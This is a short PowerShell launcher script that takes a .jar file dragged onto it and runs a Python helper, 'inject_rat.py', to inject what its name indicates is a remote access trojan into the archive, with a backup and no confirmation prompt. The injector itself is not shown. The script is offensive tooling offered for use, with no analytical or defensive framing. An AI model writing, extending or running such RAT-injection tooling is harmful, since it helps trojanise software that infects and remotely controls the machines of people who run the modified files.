param([string]$Target)
if (-not $Target) { Write-Host "Drag a .jar onto this script!"; pause; exit 1 }
py -3 "$PSScriptRoot\inject_rat.py" $Target --backup --yes
if ($LASTEXITCODE -ne 0) { pause }
